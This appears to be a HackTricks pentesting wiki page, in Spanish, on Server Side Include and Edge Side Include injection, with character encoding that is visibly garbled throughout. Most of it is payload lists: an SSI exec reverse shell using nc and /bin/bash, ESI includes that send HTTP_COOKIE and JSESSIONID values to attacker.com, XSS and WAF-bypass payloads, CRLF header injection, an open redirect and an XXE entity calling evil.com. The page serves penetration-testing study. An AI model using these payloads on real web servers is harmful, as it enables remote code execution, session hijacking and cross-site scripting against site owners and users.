# Server Side Inclusion/Edge Side Inclusion Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Server Side Inclusion Basic Information

**(Introducci칩n tomada de [documentos de Apache](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) son directivas que se **colocan en p치ginas HTML y se eval칰an en el servidor** mientras se sirven las p치ginas. Te permiten **agregar contenido generado din치micamente** a una p치gina HTML existente, sin tener que servir toda la p치gina a trav칠s de un programa CGI u otra tecnolog칤a din치mica.\
Por ejemplo, podr칤as colocar una directiva en una p치gina HTML existente, como:

`<!--#echo var="DATE_LOCAL" -->`

Y, cuando se sirva la p치gina, este fragmento ser치 evaluado y reemplazado por su valor:

`Tuesday, 15-Jan-2013 19:28:54 EST`

La decisi칩n de cu치ndo usar SSI y cu치ndo hacer que tu p치gina sea completamente generada por alg칰n programa, generalmente es una cuesti칩n de cu치nto de la p치gina es est치tico y cu치nto necesita ser recalculado cada vez que se sirve la p치gina. SSI es una excelente manera de agregar peque침as piezas de informaci칩n, como la hora actual - mostrada arriba. Pero si la mayor칤a de tu p치gina se genera en el momento en que se sirve, necesitas buscar alguna otra soluci칩n.

Puedes inferir la presencia de SSI si la aplicaci칩n web utiliza archivos con las extensiones **`.shtml`, `.shtm` o `.stm`**, pero no es solo el caso.

Una expresi칩n t칤pica de SSI tiene el siguiente formato:
```
<!--#directive param="value" -->
```
### Verificar
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

Hay un problema **con la informaci칩n en cach칠 o aplicaciones din치micas** ya que parte del contenido puede haber **variado** para la pr칩xima vez que se recupere el contenido. Esto es para lo que se utiliza **ESI**, para indicar usando etiquetas ESI el **contenido din치mico que necesita ser generado** antes de enviar la versi칩n en cach칠.\
si un **atacante** es capaz de **inyectar una etiqueta ESI** dentro del contenido en cach칠, entonces, podr칤a ser capaz de **inyectar contenido arbitrario** en el documento antes de que se env칤e a los usuarios.

### Detecci칩n de ESI

El siguiente **encabezado** en una respuesta del servidor significa que el servidor est치 utilizando ESI:
```
Surrogate-Control: content="ESI/1.0"
```
Si no puedes encontrar este encabezado, el servidor **podr칤a estar utilizando ESI de todos modos**.\
Un **enfoque de explotaci칩n ciega tambi칠n se puede utilizar** ya que una solicitud deber칤a llegar al servidor del atacante:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI explotaci칩n

[GoSecure cre칩](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) una tabla para entender los posibles ataques que podemos intentar contra diferentes software compatibles con ESI, dependiendo de la funcionalidad soportada:

* **Includes**: Soporta la directiva `<esi:includes>`
* **Vars**: Soporta la directiva `<esi:vars>`. 칔til para eludir filtros XSS
* **Cookie**: Las cookies del documento son accesibles para el motor ESI
* **Encabezados de upstream requeridos**: Las aplicaciones sustitutas no procesar치n las declaraciones ESI a menos que la aplicaci칩n upstream proporcione los encabezados
* **Lista blanca de hosts**: En este caso, los includes ESI solo son posibles desde hosts de servidor permitidos, haciendo que SSRF, por ejemplo, solo sea posible contra esos hosts

|         **Software**         | **Includes** | **Vars** | **Cookies** | **Encabezados de upstream requeridos** | **Lista blanca de hosts** |
| :--------------------------: | :----------: | :------: | :---------: | :-----------------------------------: | :-----------------------: |
|            Squid3            |      S칤      |    S칤    |     S칤      |                S칤                     |           No              |
|         Varnish Cache        |      S칤      |    No     |      No     |                S칤                     |           S칤              |
|            Fastly            |      S칤      |    No     |      No     |                No                     |           S칤              |
| Akamai ESI Test Server (ETS) |      S칤      |    S칤    |     S칤      |                No                     |           No              |
|          NodeJS esi          |      S칤      |    S칤    |     S칤      |                No                     |           No              |
|         NodeJS nodesi        |      S칤      |    No     |      No     |                No                     |        Opcional           |

#### XSS

La siguiente directiva ESI cargar치 un archivo arbitrario dentro de la respuesta del servidor
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Eludir la protecci칩n XSS del cliente
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Robar Cookie

* Robo remoto de cookie
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* Robar cookie HTTP\_ONLY con XSS reflej치ndolo en la respuesta:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Archivo Local Privado

No confundir esto con una "Inclusi칩n de Archivo Local":
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Open Redirect

Lo siguiente a침adir치 un encabezado `Location` a la respuesta
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Agregar Encabezado

* Agregar encabezado en la solicitud forzada
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* Agregar encabezado en la respuesta (칰til para eludir "Content-Type: text/json" en una respuesta con XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF en el encabezado Add (**CVE-2019-2438**)
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

Esto enviar치 informaci칩n de depuraci칩n incluida en la respuesta:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

Al especificar el valor `xslt` para el par치metro _dca_, es factible incluir **`eXtensible Stylesheet Language Transformations (XSLT)`** basado en ESI. La inclusi칩n provoca que el sustituto HTTP recupere los archivos XML y XSLT, siendo este 칰ltimo el que filtra al primero. Tales archivos XML son explotables para ataques de _XML External Entity (XXE)_, permitiendo a los atacantes ejecutar ataques SSRF. Sin embargo, la utilidad de este enfoque es limitada ya que ESI ya sirve como un vector SSRF. Debido a la ausencia de soporte en la biblioteca subyacente Xalan, los DTD externos no son procesados, lo que impide la extracci칩n de archivos locales.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
Archivo XSLT:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Check the XSLT page:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Referencias

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Lista de Detecci칩n de Fuerza Bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
